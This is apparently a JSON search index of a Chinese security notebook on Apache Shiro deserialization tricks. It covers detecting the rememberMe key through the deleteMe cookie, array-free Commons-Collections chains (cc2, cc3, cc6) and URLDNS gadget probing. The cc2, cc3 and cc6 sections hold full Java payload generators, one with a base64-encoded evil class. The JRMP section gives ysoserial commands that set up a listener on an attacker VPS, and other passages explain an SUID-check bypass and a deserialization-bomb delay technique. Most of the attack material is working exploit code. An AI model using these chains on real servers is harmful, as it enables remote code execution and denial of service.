\u5f53\u89e3\u6790HashMap\u65f6\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\u4f1a\u89e3\u6790key\u4e2d\u7684\u5bf9\u8c61\uff0c\u5982\u679ckey\u65f6URL\u5bf9\u8c61\u5219\u4f1a\u5bf9\u5176\u6307\u5b9a\u7684DNS\u5730\u5740\u8fdb\u884c\u4e00\u6b21\u89e3\u3002 \u4f46\u662f\u82e5HashMap\u91cckey\u5bf9\u5e94\u7684value\u7684\u5bf9\u8c61\u4e0d\u5b58\u5728\uff0c\u5c31\u65e0\u6cd5\u88ab\u53cd\u5e8f\u5217\u5316\uff0c\u5219\u4f1a\u629b\u51fa\u9519\u8bef\uff0c\u5bfc\u81f4\u540e\u9762\u7684DNS\u89e3\u6790\u5931\u8d25\u3002 \u6240\u4ee5\u5c31\u53ef\u4ee5\u4ee5\u6b64\u4e3a\u57fa\u51c6\u63a2\u6d4b\u76ee\u6807\u73af\u5883\u662f\u5426\u5b58\u5728\u67d0\u4e2aClass\u6765\u63a8\u6d4b\u76ee\u6807\u73af\u5883\u662f\u5426\u5b58\u5728\u67d0Gadget\uff1a\u82e5Gadget\u5b58\u5728\u5219\u4f1a\u4ea7\u751fDNS\u89e3\u6790\uff0c\u53cd\u4e4b\u5219\u4e0d\u4f1a\u4ea7\u751fDNS\u89e3\u6790\u3002 \u53cd\u5e8f\u5217\u5316\u70b8\u5f39 \u901a\u8fc7\u6784\u9020\u7279\u6b8a\u7684\u591a\u5c42\u5d4c\u5957HashSet\uff0c\u5bfc\u81f4\u670d\u52a1\u5668\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u63d0\u5347\uff0c\u6d88\u8017\u670d\u52a1\u5668\u6240\u6709\u6027\u80fd\uff0c\u5bfc\u81f4\u62d2\u7edd\u670d\u52a1\u3002\u5728\u8fd9\u4e2a\u57fa\u7840\u4e0a\uff0c\u6211\u9009\u62e9\u6d88\u8017\u90e8\u5206\u6027\u80fd\u8fbe\u5230\u95f4\u63a5\u5ef6\u65f6\u7684\u4f5c\u7528\uff0c\u6765\u63a2\u6d4bclass\u3002 \u7531\u4e8e\u6bcf\u4e2a\u670d\u52a1\u5668\u7684\u6027\u80fd\u4e0d\u4e00\u6837\uff0c\u8981\u60f3\u8ba9\u5b83\u4eec\u5ef6\u65f6\u65f6\u95f4\u76f8\u540c\uff0c\u5c31\u9700\u8981\u8c03\u6574\u53cd\u5e8f\u5217\u5316\u70b8\u5f39\u7684\u6df1\u5ea6\u3002\u6240\u4ee5\u5728\u4f7f\u7528\u8be5gadget\u65f6\uff0c\u8981\u5148\u6d4b\u8bd5\u51fa\u6df1\u5ea6\uff0c\u4e00\u822c\u6700\u597d\u8c03\u6574\u5230\u6bd4\u6b63\u5e38\u8bf7\u6c42\u616210\u79d2\u4ee5\u4e0a\u3002\u7ecf\u8fc7\u6211\u7684\u5b9e\u6218\u4e00\u822c\u8fd9\u4e2a\u6df1\u5ea6\u90fd\u572825\u523028\u4e4b\u95f4\uff0c\u5207\u8bb0\u4e0d\u8981\u8bbe\u7f6e\u592a\u5927\u5426\u5219\u9020\u6210DOS\u3002","title":"shiro\u7684tricks"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E7%9A%84tricks/shiro%E7%9A%84tricks/#shirotricks","text":"","title":"shiro\u7684tricks"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E7%9A%84tricks/shiro%E7%9A%84tricks/#_1","text":"\u63a2\u6d4bShiro Key\u7684\u529e\u6cd5 key\u4e0d\u5bf9 key\u6b63\u786e \u63a2\u6d4b\u57fa\u51c6 Shiro CC\u94fe\u76f8\u5173\u95ee\u9898 \u65e0\u6570\u7ec4\u6539\u9020 JRMP\u4fe1\u9053 Serialize UID\u4e0d\u4e00\u81f4\u7ed5\u8fc7 \u6709\u53cd\u5e8f\u5217\u5316\u70b9\uff0c\u63a2\u6d4b\u5b58\u5728\u7684Gadget URLDNS \u53cd\u5e8f\u5217\u5316\u70b8\u5f39","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E7%9A%84tricks/shiro%E7%9A%84tricks/#shiro-key","text":"\u5728Shiro \u53cd\u5e8f\u5217\u5316rememberMe\u5b57\u6bb5\u65f6\uff0c\u4f1a\u7ecf\u8fc7\u8fd9\u4e2a\u65b9\u6cd5\u3002 AbstractRememberMeManager#getRememberedPrincipals \u6b63\u5e38\u7684\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u9014\u5f84\u662f\u5148\u4ecegetRememberedSerializedIdentity\u65b9\u6cd5\u4e2d\u83b7\u53d6rememberMe\u7684\u503c\uff0c\u7136\u540e\u8fdb\u884cCBC\u586b\u5145\uff0c\u7136\u540e\u8fdb\u884cBase64\u89e3\u5bc6 \u7136\u540e\u4ea4\u7ed9\u540e\u9762\u7684convertBytesToPrincipals\u8fdb\u884caes\u89e3\u5bc6\u5e76\u5c06\u7ed3\u679c\u53cd\u5e8f\u5217\u5316\u3002","title":"\u63a2\u6d4bShiro Key\u7684\u529e\u6cd5"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E7%9A%84tricks/shiro%E7%9A%84tricks/#key","text":"\u5f53\u53cd\u5e8f\u5217\u5316\u65f6\uff0crememberMe\u7684key\u4e0d\u5bf9\uff0c\u4f1a\u5bfc\u81f4aes\u89e3\u5bc6\u5931\u8d25\uff0c\u4ea7\u751f\u62a5\u9519\u88ab\u4e0b\u9762\u7684catch\u5757\u63a5\u6536\u5230\u629b\u51fa\u5f02\u5e38\uff0c\u6211\u4eec\u770b\u770bcatch\u5757\u91cc\u9762\u7684onRememberedPrincipalFailure\u51fd\u6570\u662f\u4ec0\u4e48 \u9010\u6b65\u8ddf\u8fdb \u8ddf\u8fdb\u540e\u53d1\u73b0forgetIdentity \u83b7\u53d6\u4e86request\u3001response\u5bf9\u8c61\u5e76\u4ea4\u7ed9\u53e6\u4e00\u4e2a\u91cd\u6784\u65b9\u6cd5\u5904\u7406 \u8ddf\u8fdb\u540e\u518d\u8ddf\u8fdbremoveFrom \u53d1\u73b0\u5728\u8fd4\u56de\u5934\u91cc\u52a0\u4e86cookie\uff1arememberMe=deleteMe","title":"key\u4e0d\u5bf9"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E7%9A%84tricks/shiro%E7%9A%84tricks/#key_1","text":"key\u6b63\u786e\uff0c\u5728\u4e00\u822c\u7684\u5229\u7528\u60c5\u51b5\u4e0b\u4f9d\u65e7\u4f1a\u88ab AbstractRememberMeManager#getRememberedPrincipals \u63a5\u53d7\u5f02\u5e38\u5e76\u629b\u51fa\uff0c\u7a76\u5176\u539f\u56e0\uff0c\u662f\u5728\u53cd\u5e8f\u5217\u5316\u65f6\u4ee3\u7801\u4e2d\u4f7f\u7528\u4e86\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\uff0c\u800c\u6211\u4eec\u653b\u51fb\u65f6\u5e8f\u5217\u5316\u7684\u7c7b\u662f\u65e0\u6cd5\u8f6c\u6362\u4e3a PrincipalCoolection\u3002 \u4f46\u662f\u5982\u679c\u6211\u4eec\u5e8f\u5217\u5316\u7684\u7c7b\u662fPrincipalCollection\u7684\u53ef\u53cd\u5e8f\u5217\u5316\u5b50\u7c7b\uff0c\u90a3\u4e48\u5f53key\u6b63\u786e\u65f6\u54cd\u5e94\u5934\u5c06\u4e0d\u4f1a\u6709Set-Cookie: rememberMe=deleteMe\uff0ckey\u4e0d\u6b63\u786e\u65f6\u5219\u4f1a\u6709\uff0c\u4fbf\u53ef\u4ee5\u4ee5\u6b64\u4e3a\u57fa\u51c6\u68c0\u6d4bkey\u662f\u5426\u6b63\u786e\u3002","title":"key\u6b63\u786e"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E7%9A%84tricks/shiro%E7%9A%84tricks/#_2","text":"\u90a3\u4e48\u603b\u7ed3\u4e00\u4e0b\u4e0a\u9762\u7684\u4e24\u79cd\u60c5\u51b5\uff0c\u8981\u60f3\u8fbe\u5230\u53ea\u4f9d\u8d56shiro\u81ea\u8eab\u8fdb\u884ckey\u68c0\u6d4b\uff0c\u53ea\u9700\u8981\u6ee1\u8db3\u4e24\u70b9\uff1a 1.\u6784\u9020\u4e00\u4e2a\u7ee7\u627f PrincipalCollection \u7684\u5e8f\u5217\u5316\u5bf9\u8c61\u3002 2.key\u6b63\u786e\u60c5\u51b5\u4e0b\u4e0d\u8fd4\u56de deleteMe \uff0ckey\u9519\u8bef\u60c5\u51b5\u4e0b\u8fd4\u56de deleteMe \u3002 \u90a3\u4e48\u73b0\u5728\u5c31\u5b58\u5728\u7c7bSimplePrincipalCollection\uff0c\u5176\u7ee7\u627f\u81eaPrincipalCollection\u4e14\u53ef\u88ab\u53cd\u5e8f\u5217\u5316\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u7528\u8fd9\u4e2a\u7c7b\u6765\u63a2\u6d4bkey\u4e86\u3002","title":"\u63a2\u6d4b\u57fa\u51c6"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E7%9A%84tricks/shiro%E7%9A%84tricks/#shiro-cc","text":"shiro\u4e2d\u53cd\u5e8f\u5217\u5316\u91cd\u5199\u4e86resolveClass\uff0c\u4e0d\u80fd\u5904\u7406\u6570\u7ec4\uff0c\u6240\u4ee5\u4e00\u4e9bcc\u94fe\u5728shiro\u4e2d\u7528\u5c31\u4f1a\u6709\u95ee\u9898\u3002","title":"Shiro CC\u94fe\u76f8\u5173\u95ee\u9898"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E7%9A%84tricks/shiro%E7%9A%84tricks/#_3","text":"\u80fd\u6539\u9020\u6210\u65e0\u6570\u7ec4\u5f62\u5f0f\u7684CC\u94fe\u53ea\u6709 cc2\u3001cc3\u3001cc6 cc2 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.PriorityQueue; public class Main { public static void main(String[] args) throws Exception{ Constructor constructor = Class.forName(\"org.apache.commons.collections4.functors.InvokerTransformer\").getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\"newTransformer\"); TransformingComparator Tcomparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(1); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); //cc.writeFile(); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"blckder02\"); setFieldValue(templates, \"_class\", null); Object[] queue_array = new Object[]{templates,1}; Field queue_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"queue\"); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"size\"); size.setAccessible(true); size.set(queue,2); Field comparator_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); comparator_field.setAccessible(true); comparator_field.set(queue,Tcomparator); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc2.bin\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc2.bin\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class<?> clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } cc3 package com.shiroTest; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.xml.transform.Templates; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class CC3 { public byte[] getPayload2() throws Exception{ byte[] bytes = Base64.getDecoder().decode(\"yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAhTGNvbS9UZW1wbGFzdGVzSW1wbFRlc3QvY29kZVRlc3Q7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACUBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgcAJgEAClNvdXJjZUZpbGUBAA1jb2RlVGVzdC5qYXZhDAAZABoHACcMACgAKQEABGNhbGMMACoAKwEAH2NvbS9UZW1wbGFzdGVzSW1wbFRlc3QvY29kZVRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAABEACwAAACAAAwAAAAEADAANAAAAAAABAA4ADwABAAAAAQAQABEAAgASAAAABAABABMAAQAHABQAAgAJAAAASQAAAAQAAAABsQAAAAIACgAAAAYAAQAAABYACwAAACoABAAAAAEADAANAAAAAAABAA4ADwABAAAAAQAVABYAAgAAAAEAFwAYAAMAEgAAAAQAAQATAAEAGQAaAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAAGAAEABkADQAaAAsAAAAMAAEAAAAOAAwADQAAABIAAAAEAAEAGwABABwAAAACAB0=\"); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates,\"_bytecodes\",new byte[][]{bytes}); setFieldValue(templates,\"_name\",\"dwa\"); setFieldValue(templates,\"_tfactory\",new TransformerFactoryImpl()); Transformer transformers = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}); HashMap<Object, Object> map = new HashMap<>(); Map<Object,Object> lazymap = LazyMap.decorate(map, new ConstantTransformer(1)); //\u7b2c\u4e00\u4e2a\u53c2\u6570\u7684map // get\u65b9\u6cd5\u4e2d\u8c03\u7528\u7684\u662fmap.get // \u76ee\u7684\u662f\u8c03\u7528lazyMap\u4e2d\u7684get\u65b9\u6cd5 \u6240\u4ee5\u7b2c\u4e00\u4e2a\u53c2\u6570\u662flazyMap TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\")); HashMap<Object, Object> map2 = new HashMap<>(); //hashMap\u7684readObject\u65f6\u4f1a\u8c03\u7528hash\u65b9\u6cd5 // \u7136\u540ekey.hashCode() \u4f1a\u8c03\u7528key\u7684hashCode\u65b9\u6cd5 key\u7684\u503c\u4e3atiedMapEntry //\u8c03\u7528tiedMapEntry\u7684hashCode\u7136\u540e\u5f85\u7528getValue\u65b9\u6cd5 \u7136\u540e\u8c03\u7528get\u65b9\u6cd5 map2.put(tiedMapEntry, \"sss\"); lazymap.remove(Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\")); Class c = LazyMap.class; Field factoryField = c.getDeclaredField(\"factory\"); factoryField.setAccessible(true); factoryField.set(lazymap,transformers); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr); objectOutputStream.writeObject(map2); objectOutputStream.close(); return barr.toByteArray(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } cc6 package org.payload.cc.CC6; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import org.Tools.ClassTools; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import java.io.ByteArrayInputStream; import java.io.ObjectInputStream; import java.util.*; import static org.Tools.ClassTools.setFieldValue; public class CommonsCollections6TemplatesImpl { public Map CommonsCollections6TemplatesImpl(String args) throws Exception { ClassTools ct = new ClassTools(); byte[] evilClass = ct.MakeEvilClass(\"org.Tools.evilclass.EvilClass\"); //byte[] evilClass = evilClass2(\"java.lang.Runtime.getRuntime().exec(\\\"\"+args+\"\\\");\"); TemplatesImpl tmp = ct.template(evilClass); InvokerTransformer transformer = new InvokerTransformer(\"toString\", null, null); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformer); TiedMapEntry tme = new TiedMapEntry(outerMap, tmp); Map expMap = new HashMap(); expMap.put(tme, \"valuevalue\"); outerMap.clear(); setFieldValue(transformer, \"iMethodName\", \"newTransformer\"); return expMap; } public static byte[] CommonsCollections6TemplatesImplPayload(String args) throws Exception { ClassTools ct = new ClassTools(); CommonsCollections6TemplatesImpl commonsCollections6Templates = new CommonsCollections6TemplatesImpl(); Object evil = commonsCollections6Templates.CommonsCollections6TemplatesImpl(args); return ct.serial(evil); } public static void main(String[] args) throws Exception { byte[] evilByteClass = CommonsCollections6TemplatesImplPayload(\"calc.exe\"); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(evilByteClass)); ois.readObject(); } }","title":"\u65e0\u6570\u7ec4\u6539\u9020"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E7%9A%84tricks/shiro%E7%9A%84tricks/#jrmp","text":"\u5f53\u7136\uff0c\u5982\u679cJRMP\u8054\u901a\u4e86\uff0c\u76f4\u63a5\u8d70JRMP\u901a\u9053\u62ff\u5565\u90fd\u53ef\u4ee5\u6253\u4e86 vps\u4e0a\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff0c\u76d1\u542c\u7aef\u53e3 java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 12006 CommonsCollections5 'calc' \u6211\u4eec\u518d\u901a\u8fc7ysoserial\u751f\u6210payload java -jar ysoserial-master-SNAPSHOT.jar JRMPClient 'vps_ip:12006'|base64|sed ':label;N;s/\\n//;b label' \u7136\u540e\u4f2a\u9020cookie\uff0c\u53d1\u8fc7\u53bb\uff0c\u6210\u529f\u5f39\u8ba1\u7b97\u5668","title":"JRMP\u4fe1\u9053"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E7%9A%84tricks/shiro%E7%9A%84tricks/#serialize-uid","text":"\u5728\u653b\u51fb\u65f6\uff0c\u5982\u679c\u6784\u9020\u7684\u5e8f\u5217\u5316\u5bf9\u8c61SUID\u548c\u76ee\u6807\u4e0a\u7684\u5bf9\u8c61SUID\u4e0d\u4e00\u81f4\uff0c\u5219\u65e0\u6cd5\u5b8c\u6210\u53cd\u5e8f\u5217\u5316\u629b\u51fa\u9519\u8bef\u3002 \u6838\u5fc3\u68c0\u6d4b\u4ee3\u7801\u5982\u4e0b // SUID\u68c0\u67e5\u6761\u4ef6\uff1a\u662f\u5426\u90fd\u6216\u90fd\u6ca1\u6709\u5b9e\u73b0\u4e86Serializable\u63a5\u53e3 && \u4e0d\u662f\u6570\u7ec4\u7c7b && suid\u4e0d\u76f8\u540c if (serializable == localDesc.serializable && !cl.isArray() && suid.longValue() != localDesc.getSerialVersionUID()) { throw new InvalidClassException(localDesc.name, \"local class incompatible: \" + \"stream classdesc serialVersionUID = \" + suid + \", local class serialVersionUID = \" + localDesc.getSerialVersionUID()); } \u52a8\u6001\u751f\u6210\u4e00\u4e2aA\u7c7b\u4e0d\u5b9e\u73b0Serializable\u63a5\u53e3\u8fdb\u884c\u5e8f\u5217\u5316\u3002\u5982\u679c\u7ebf\u4e0a\u7684A\u7c7b\u662f\u5b9e\u73b0Serializable\u63a5\u53e3\uff0c\u7b2c\u4e00\u4e2a\u6761\u4ef6\u5c31\u4e0d\u6210\u7acb\u4e86\u76f4\u63a5\u7ed5\u8fc7\u3002\u5982\u679c\u7ebf\u4e0a\u7684Class\u6ca1\u6709\u5b9e\u73b0\u6539\u63a5\u53e3\uff0c\u5219\u4e24\u8005suid\u90fd\u4e3a0L,\u7b2c\u4e09\u4e2a\u6761\u4ef6\u4e0d\u7b26\u5408\uff0c\u81ea\u7136\u65e0\u9700\u68c0\u67e5\u3002 \u76f4\u63a5\u5e8f\u5217\u5316A[].class\uff0c\u7b2c\u4e8c\u4e2a\u6761\u4ef6\u76f4\u63a5\u4e0d\u7b26\u5408\uff0c\u76f4\u63a5\u4e0d\u7528\u68c0\u67e5SUID\uff0c\u65e0\u9700\u5173\u5fc3\u5b9e\u73b0\u5b9e\u73b0Serializable\u63a5\u53e3\u3002","title":"Serialize UID\u4e0d\u4e00\u81f4\u7ed5\u8fc7"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E7%9A%84tricks/shiro%E7%9A%84tricks/#gadget","text":"ref\uff1a https://mp.weixin.qq.com/s?__biz=Mzg3NjA4MTQ1NQ==\\&mid=2247484178\\&idx=1\\&sn=228ccc3d624f2d64a6c1d51555c42eea\\&chksm=cf36fb52f8417244ea608ea14da45b876548617864179c8da6df46010bed78aa41c4a2277cb8\\&mpshare=1\\&scene=23\\&srcid=0223h9KLw3Bpv4B57cmWkp7z\\&sharer_sharetime=1645787561952\\&sharer_shareid=ff51a992c5bfd7616a29069bf0989669#rd","title":"\u6709\u53cd\u5e8f\u5217\u5316\u70b9\uff0c\u63a2\u6d4b\u5b58\u5728\u7684Gadget"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E7%9A%84tricks/shiro%E7%9A%84tricks/#urldns","text":"URLDNS\u94fe\u6709\u5982\u4e0b\u4ee3\u7801 // java.util.HashMap#readObject private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { ...... // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i < mappings; i++) { @SuppressWarnings(\"unchecked\") K key = (K) s.readObject(); @SuppressWarnings(\"unchecked\") V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } } } \u5f53\u89e3\u6790HashMap\u65f6\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\u4f1a\u89e3\u6790key\u4e2d\u7684\u5bf9\u8c61\uff0c\u5982\u679ckey\u65f6URL\u5bf9\u8c61\u5219\u4f1a\u5bf9\u5176\u6307\u5b9a\u7684DNS\u5730\u5740\u8fdb\u884c\u4e00\u6b21\u89e3\u3002 \u4f46\u662f\u82e5HashMap\u91cckey\u5bf9\u5e94\u7684value\u7684\u5bf9\u8c61\u4e0d\u5b58\u5728\uff0c\u5c31\u65e0\u6cd5\u88ab\u53cd\u5e8f\u5217\u5316\uff0c\u5219\u4f1a\u629b\u51fa\u9519\u8bef\uff0c\u5bfc\u81f4\u540e\u9762\u7684DNS\u89e3\u6790\u5931\u8d25\u3002 \u6240\u4ee5\u5c31\u53ef\u4ee5\u4ee5\u6b64\u4e3a\u57fa\u51c6\u63a2\u6d4b\u76ee\u6807\u73af\u5883\u662f\u5426\u5b58\u5728\u67d0\u4e2aClass\u6765\u63a8\u6d4b\u76ee\u6807\u73af\u5883\u662f\u5426\u5b58\u5728\u67d0Gadget\uff1a\u82e5Gadget\u5b58\u5728\u5219\u4f1a\u4ea7\u751fDNS\u89e3\u6790\uff0c\u53cd\u4e4b\u5219\u4e0d\u4f1a\u4ea7\u751fDNS\u89e3\u6790\u3002","title":"URLDNS"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E7%9A%84tricks/shiro%E7%9A%84tricks/#_4","text":"\u901a\u8fc7\u6784\u9020\u7279\u6b8a\u7684\u591a\u5c42\u5d4c\u5957HashSet\uff0c\u5bfc\u81f4\u670d\u52a1\u5668\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u63d0\u5347\uff0c\u6d88\u8017\u670d\u52a1\u5668\u6240\u6709\u6027\u80fd\uff0c\u5bfc\u81f4\u62d2\u7edd\u670d\u52a1\u3002\u5728\u8fd9\u4e2a\u57fa\u7840\u4e0a\uff0c\u6211\u9009\u62e9\u6d88\u8017\u90e8\u5206\u6027\u80fd\u8fbe\u5230\u95f4\u63a5\u5ef6\u65f6\u7684\u4f5c\u7528\uff0c\u6765\u63a2\u6d4bclass\u3002 